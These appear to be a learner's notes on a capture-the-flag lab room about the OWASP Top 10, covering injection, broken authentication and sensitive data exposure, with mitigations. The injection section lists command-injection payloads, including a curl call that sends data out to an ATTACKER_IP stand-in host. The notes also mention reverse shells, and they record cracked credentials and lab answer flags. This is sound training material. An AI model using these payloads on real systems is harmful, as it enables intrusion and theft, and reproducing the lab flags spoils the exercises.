# OWASP Top10

# Introduction
- This room breaks each OWASP topic down and includes details on what the vulnerability is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.
  - Injection
  - Broken Authentication
  - Sensitive Data Exposure
  - XML External Entity
  - Broken Access Control
  - Security Misconfiguration
  - Cross-site Scripting
  - Insecure Deserialization
  - Components with Known Vulnerabilities
  - Insufficent Logging & Monitoring


## Injection

### Concepts learned
- Injection: attacker-controlled input is interpreted as code/commands by a backend (SQL, OS shell, LDAP, etc.).
- Common types: SQL Injection (manipulate database queries) and OS/Command Injection (execute system commands).
- Impact: data disclosure, modification/deletion, remote code execution, full server compromise.
- Defence principles: never treat user input as executable — use allow-lists, parameterized APIs, escaping only as last resort.

### Explanation
**Injection happens when an application concatenates raw input into a command or query string. Example risks:**
  - "... WHERE id = " + user_input → SQL injection (user_input = "1 OR 1=1").
  - passthru("cmd " + user_input) → command injection (user_input = "$(whoami)").
**Active (reflected) vs Blind command injection:**
  - Active: command output is returned in the HTTP response — easy to verify interactively.
  - Blind: output not returned — confirm via timing (sleep), side channels, or OOB callbacks.
**Typical attack primitives:**
  - Command separators: ;, &&, |
  - Inline substitution: $(cmd) or `cmd`
  - Time-based tests: sleep 5
  - OOB exfiltration: curl http://attacker/... or DNS/ping to attacker-controlled service

### Notes — Practical detection, payloads & mitigations
**Quick detection checklist**
  - Identify inputs that reach DBs or system calls (form fields, URL params, headers, file names).
  - Try harmless commands and observe output: whoami, id, uname -a, cat /etc/issue.
  - Separator tests: append ; whoami, && id.
  - Inline tests: $(whoami) or `whoami`.
  - Blind tests: ; sleep 5 (observe latency).
  - OOB tests: trigger curl http://<your-listener>/p and monitor listener.
**Representative payloads**
  - Active check: ?cmd=whoami
  - Separator: ?cmd=blah; whoami
  - Inline: ?cmd=$(whoami)
  - Time-based blind: ?cmd=sleep 5
  - OOB: ?cmd=curl http://ATTACKER_IP/p?$(whoami)
**Typical lab findings**
  - Webserver user often exposed (www-data, apache, www), shell may be nologin.
  - OS/version and MOTD can be enumerated via uname -a and cat /etc/issue.
  - Example artifact: found drpepper.txt in webroot (lab exercise).
**Exploitation notes** 
  - If active exec possible and environment allows, reverse shells are a next step — use safest supported stager (Python/Perl/PHP) and avoid destructive commands.
  - If command output not returned, use timing or OOB callbacks to confirm execution.
  - Document payloads, responses, user context, and any files accessed.
**Mitigations**
  - Eliminate string concatenation for queries/commands.
  - DB: use prepared statements / parameterized queries.
  - OS: use APIs that accept argument arrays (execv style), not shell interpolation.
  - Allow-list input validation (accept known-good values).
  - Escape only when unavoidable, and use context-correct escaping libraries.
  - Least privilege: run services with minimal rights; avoid running web processes as root.
  - Disable dangerous functions where feasible; sandbox critical operations.
  - WAF/RASP can be a temporary layer but don’t substitute secure coding.
  - Log & monitor for suspicious params, time delays, and anomalous outbound requests; alert on OOB callbacks.
**checklist**
  - Record: endpoint, parameter name, full request, successful payload, response, webserver user, OS/version.
  - Categorize: active or blind injection.
  - Recommend fixes: parameterized queries, allow-listing, least privilege, input logging.


## Broken Authentication

### Concepts learned
- Broken Authentication: flaws in how an application verifies identity or manages sessions that allow attackers to impersonate users or bypass authentication controls.
- Common issues: weak/guessable credentials, lack of brute-force protections, predictable session tokens/cookies, insecure password reset flows, and logic flaws (e.g., re-registration or username normalization issues).
- Impact: account takeover, data exposure, privilege escalation, fraudulent transactions.

### Explanation
- Web apps are stateless; authentication typically creates a server-side session referenced by a cookie or token. If the auth process, token generation, or session handling is flawed, an attacker can gain unauthorized access.
**Attack vectors**
  - Password guessing / brute force: no rate-limit or lockout allows automated guessing.
  - Weak credentials: common/simple passwords succeed without guessing.
  - Predictable session tokens: attacker forges cookies or tokens and impersonates users.
  - Logic flaws: application treats distinct inputs as equivalent (e.g., "admin" vs " admin"), permitting re-registration or duplicate-account access.
  - Insecure reset flows: predictable reset tokens or exposure of reset endpoints.
- Practical example (lab): re-registration bypass — registering the same username with a leading space (" darren") created an account that inherited access/visibility of the original darren account (logic/normalization bug). This allowed retrieval of flags from other users’ accounts.

### Notes — Practical tests, findings & mitigations
**Quick tests / checks** 
  - Try common credentials (password, 123456, etc.) against login and registration flows.
  - Test for rate-limiting by repeated login attempts; monitor response behavior and delays.
  - Inspect session cookies/tokens: Are values random/unpredictable? Are cookies marked HttpOnly, Secure, SameSite?
  - Check registration/login normalization: submit usernames with leading/trailing whitespace, different casing, unicode homoglyphs, or URL-encoded characters and see if accounts collide.
  - Review password reset: is the reset token long, random, single-use, and time-limited?
**Representative payloads / actions**
  - Brute test (be careful; always authorized): automated attempts using a small wordlist + observe lockouts/302s.
  - Re-registration trick: register " username" (leading space) or "username%20" and test whether it maps to existing account.
  - Session tampering: modify cookie value in browser DevTools to a guessed/predictable token and refresh.
**Lab findings**
  - Found flags in other users’ accounts by registering " darren" and " arthur".
  - darren flag: fe86079416a21a3c99937fea8874b667
  - arthur flag: d9ac0f7db4fda460ac3edeb75d75e16e
  - Authentication logic failed to normalise/validate usernames consistently; created duplicate accounts with equivalent privileges.
### Mitigations
  - Enforce strong password policies and encourage/require MFA (TOTP, hardware keys).
  - Rate-limit and lock accounts (progressive delays, CAPTCHAs, temporary lockouts) after repeated failures; notify users of suspicious attempts.
**Harden session management:**
  - Generate high-entropy, unguessable session identifiers.
  - Set cookie flags: HttpOnly, Secure, and appropriate SameSite.
  - Invalidate sessions on logout and rotate session IDs after privilege changes/login.
  - Normalize & validate identifiers: trim whitespace, canonicalize case and unicode, and reject or normalize suspicious input at registration and login. Ensure uniqueness checks use the same normalization rules.
  - Secure password reset flows: long random tokens, single-use, short expiry, and out-of-band notifications.
  - Monitor & alert on anomalous authentication activity (high failure rates, many accounts created from single IP, reuse of similar usernames).
  - Audit & test: run automated scans and targeted manual tests for auth logic and session handling.
**checklist**
  - Evidence: full request/response for successful exploit (registration request, session cookie, page showing other user’s data).
  - Classify: vulnerability type (logic / session management / weak password policy).
  - Impact: account takeover / data disclosure (list affected accounts).
  - Fix recommendations: normalization rules, session hardening, rate limiting, MFA.


## Sensitive Data Exposure

### Concepts learned
- Sensitive Data Exposure: when an application inadvertently reveals confidential information (PII, passwords, payment data, API keys, etc.) either in transit or at rest.
- Flat-file databases (SQLite): small applications may store DB files under webroots; if accessible, attackers can download and read them.
- Offline cracking: captured password hashes (e.g., MD5, SHA1) can often be reversed using online services or local tools (John, Hashcat) with wordlists.
- Common impacts: credential theft, financial fraud, identity exposure, and further account takeover or lateral attacks.

### Explanation
- Sensitive data can be exposed in many places: web responses, backup files, misconfigured storage, or files under the webroot. If the DB file (e.g., webapp.db) is publicly downloadable, an attacker can retrieve the entire dataset and analyse it locally.
- For SQLite files: use sqlite3 <file> to inspect .tables, use PRAGMA table_info(table); to understand column meanings, and SELECT * FROM table; to dump records.
- Passwords stored as weak hashes (MD5, unsalted SHA1) are vulnerable to dictionary/lookup attacks (CrackStation, rockyou, hashcat). Even hashed credit-card or personal data becomes sensitive once exposed.
- Even if data is encrypted in transit (HTTPS), data at rest must be stored and accessed securely; improperly placed files are high risk.

### Notes — Practical steps, lab findings & mitigations
**Quick commands**
**Inspect sqlite file**
  - sqlite3 webapp.db
  - sqlite> .tables
  - sqlite> PRAGMA table_info(customers);
  - sqlite> SELECT * FROM customers;
**Compute file hashes (integrity checks)**
  - md5sum webapp.db
  - sha256sum webapp.db
**Simple listener for SSRF/testing**
  - nc -lvp 80
- Typical workflow after downloading a DB
- sqlite3 webapp.db → .tables → PRAGMA table_info(<table>); → SELECT * FROM <table>;
- Identify columns containing sensitive values (password, creditCard, api_key).
- Export hashes and attempt cracking with online services (CrackStation) or local tools (John/Hashcat) using appropriate format options and wordlists.
- Use recovered credentials to attempt login (only in authorized lab environments). Log and preserve artifacts (requests, DB copy, cracked results).
**Lab example**
  - Developer left a note pointing to /assets. Found webapp.db.
  - PRAGMA table_info(customers); revealed columns including password.
  - Admin hash: 6eea9b7ef19179a06954edd0f6c05ceb → cracked to qwertyuiop.
  - Logged in as admin to retrieve lab flag THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} (lab-only workflow).
**Detection & indicators**
  - Publicly accessible DB or backup files under webroot (e.g., .db, .bak, .sql, .zip).
  - Unusual downloads of static files (monitor webserver logs for requests to .db or backup filenames).
  - Authentication attempts following a data download (indicates credential abuse).

### Mitigations
- Never store sensitive DB files under webroot. Place DB files outside the document root and restrict filesystem permissions.
- Use strong hashing & salting for passwords (Argon2, bcrypt, scrypt) — never MD5/SHA1 for passwords.
- Encrypt sensitive data at rest when appropriate (payment data, PII) and use proper key management.
- Remove/rotate secrets in code and config, and avoid hardcoding API keys or credentials in files served by the webserver.
- Access controls & least privilege: ensure application and OS accounts only have minimal required rights; webserver user should not have permission to expose backups.
- Prevent directory listing and block access to known DB/backup filenames via webserver config (NGINX/Apache) and WAF rules.
- Logging & alerting: detect downloads of .db/backup files and trigger alerts; monitor for credential use from unusual IPs.
- Secure deployment practices: CI/CD should not publish secrets; backups should be stored securely and rotated.
**checklist**
  - Attach evidence: file path (URL), downloaded DB copy (hash), sqlite3 outputs, and proof-of-concept login attempts (screenshots / request logs).
  - Categorize impact: leaked credentials, payment data, PII — note scope and user accounts affected.
  - Recommend fixes: move DB out of webroot, strengthen password storage, review backup policies, and add monitoring/alerts.
 

